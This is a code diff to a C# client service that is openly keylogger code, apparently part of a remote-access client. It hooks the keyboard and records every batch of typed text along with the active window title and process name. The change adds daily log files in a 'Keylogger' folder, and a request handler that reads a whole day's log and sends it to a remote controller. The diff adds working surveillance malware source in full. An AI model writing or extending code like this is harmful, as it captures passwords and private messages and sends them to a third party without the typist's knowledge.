@@ -1,8 +1,10 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading.Tasks;
 using System.Timers;
 using System.Windows.Forms;
 using Client.Networking;
@@ -25,6 +27,12 @@ namespace Client.Services
         private readonly System.Timers.Timer _batchTimer = new System.Timers.Timer();
         private int _maxChars = 50;
         private int _maxIntervalMs = 15000;
+
+        private const string HistoryFolderPath = @"D:\Keylogger";
+        private const string HistoryFileExtension = ".txt";
+        private readonly object _fileLock = new object();
+        private string _currentDateKey = string.Empty;
+        private string _currentDailyFilePath = string.Empty;
 
         private LowLevelKeyboardProc? _proc;
         private IntPtr _hookId = IntPtr.Zero;
@@ -49,6 +57,10 @@ namespace Client.Services
             _maxChars = Math.Max(1, payload.MaxChars);
             _maxIntervalMs = Math.Max(250, payload.MaxIntervalMs);
             _batchTimer.Interval = _maxIntervalMs;
+            if (_mode == KeyLoggerMode.Continuous)
+            {
+                InitializeHistoryStorage();
+            }
             _proc = HookCallback;
             _hookId = SetHook(_proc);
             _isRunning = true;
@@ -81,6 +93,16 @@ namespace Client.Services
         public void SetClientId(string? clientId)
         {
             _clientId = clientId;
+        }
+
+        public Task HandleHistoryRequestAsync(KeyLoggerHistoryRequest request)
+        {
+            var dateKey = string.IsNullOrWhiteSpace(request.DateKey) ? ToDateKey(DateTime.Now) : request.DateKey;
+            if (!string.IsNullOrEmpty(request.ClientId))
+            {
+                _clientId = request.ClientId;
+            }
+            return SendHistoryAsync(dateKey, createIfMissing: false);
         }
 
         private void InitializeComboMap()
@@ -170,6 +192,11 @@ namespace Client.Services
             }
             _buffer.Clear();
             var (title, proc) = GetWindowContext();
+            var dateKey = EnsureCurrentDateKey();
+            if (string.IsNullOrEmpty(dateKey))
+            {
+                dateKey = ToDateKey(DateTime.Now);
+            }
             var packet = new KeyLoggerBatch
             {
                 Payload = new KeyLoggerBatchPayload
@@ -177,10 +204,12 @@ namespace Client.Services
                     Text = text,
                     TimestampUtc = DateTime.UtcNow,
                     WindowTitle = title,
-                    ProcessName = proc
+                    ProcessName = proc,
+                    DateKey = dateKey
                 },
                 ClientId = _clientId
             };
+            PersistBatch(packet.Payload);
             var json = JsonHelper.Serialize(packet);
             _ = _connection.SendAsync(json);
             _batchTimer.Stop();
@@ -398,6 +427,146 @@ namespace Client.Services
             catch
             {
                 return (sb.ToString(), string.Empty);
+            }
+        }
+
+        private void InitializeHistoryStorage()
+        {
+            try
+            {
+                EnsureHistoryFolder();
+                var todayKey = ToDateKey(DateTime.Now);
+                _currentDateKey = todayKey;
+                _currentDailyFilePath = EnsureDailyFile(todayKey);
+                _ = SendHistoryAsync(todayKey, createIfMissing: true);
+            }
+            catch
+            {
+                // ignore storage initialization errors to keep keylogger running
+            }
+        }
+
+        private string EnsureCurrentDateKey()
+        {
+            try
+            {
+                var todayKey = ToDateKey(DateTime.Now);
+                if (!string.Equals(_currentDateKey, todayKey, StringComparison.Ordinal))
+                {
+                    _currentDateKey = todayKey;
+                    _currentDailyFilePath = EnsureDailyFile(todayKey);
+                    _ = SendHistoryAsync(todayKey, createIfMissing: true);
+                }
+                if (string.IsNullOrEmpty(_currentDailyFilePath) || !File.Exists(_currentDailyFilePath))
+                {
+                    _currentDailyFilePath = EnsureDailyFile(todayKey);
+                }
+                return _currentDateKey;
+            }
+            catch
+            {
+                return _currentDateKey;
+            }
+        }
+
+        private void EnsureHistoryFolder()
+        {
+            Directory.CreateDirectory(HistoryFolderPath);
+        }
+
+        private string EnsureDailyFile(string dateKey)
+        {
+            EnsureHistoryFolder();
+            var filePath = Path.Combine(HistoryFolderPath, $"{dateKey}{HistoryFileExtension}");
+            if (!File.Exists(filePath))
+            {
+                lock (_fileLock)
+                {
+                    if (!File.Exists(filePath))
+                    {
+                        using (File.Create(filePath)) { }
+                    }
+                }
+            }
+            return filePath;
+        }
+
+        private void PersistBatch(KeyLoggerBatchPayload payload)
+        {
+            try
+            {
+                var filePath = EnsureDailyFile(payload.DateKey);
+                var block = BuildHistoryBlock(payload);
+                lock (_fileLock)
+                {
+                    File.AppendAllText(filePath, block);
+                }
+            }
+            catch
+            {
+                // storage failures should not break streaming
+            }
+        }
+
+        private static string BuildHistoryBlock(KeyLoggerBatchPayload payload)
+        {
+            var sb = new StringBuilder();
+            var header = $"{payload.TimestampUtc.ToLocalTime():yyyy-MM-dd HH:mm:ss} | {payload.WindowTitle} ({payload.ProcessName})";
+            sb.AppendLine(header);
+            sb.AppendLine(payload.Text);
+            sb.AppendLine();
+            return sb.ToString();
+        }
+
+        private static string ToDateKey(DateTime date) => date.ToString("yyyy-MM-dd");
+
+        private async Task SendHistoryAsync(string dateKey, bool createIfMissing)
+        {
+            try
+            {
+                EnsureHistoryFolder();
+                var filePath = Path.Combine(HistoryFolderPath, $"{dateKey}{HistoryFileExtension}");
+                if (!File.Exists(filePath) && createIfMissing)
+                {
+                    lock (_fileLock)
+                    {
+                        if (!File.Exists(filePath))
+                        {
+                            using (File.Create(filePath)) { }
+                        }
+                    }
+                }
+                bool exists = File.Exists(filePath);
+                string content = string.Empty;
+                if (exists)
+                {
+                    lock (_fileLock)
+                    {
+                        content = File.ReadAllText(filePath);
+                    }
+                }
+                var response = new KeyLoggerHistoryResponse
+                {
+                    ClientId = _clientId,
+                    DateKey = dateKey,
+                    Exists = exists,
+                    Content = content
+                };
+                var json = JsonHelper.Serialize(response);
+                await _connection.SendAsync(json);
+            }
+            catch (Exception ex)
+            {
+                var response = new KeyLoggerHistoryResponse
+                {
+                    ClientId = _clientId,
+                    DateKey = dateKey,
+                    Exists = false,
+                    Error = ex.Message,
+                    Content = string.Empty
+                };
+                var json = JsonHelper.Serialize(response);
+                await _connection.SendAsync(json);
             }
         }
 
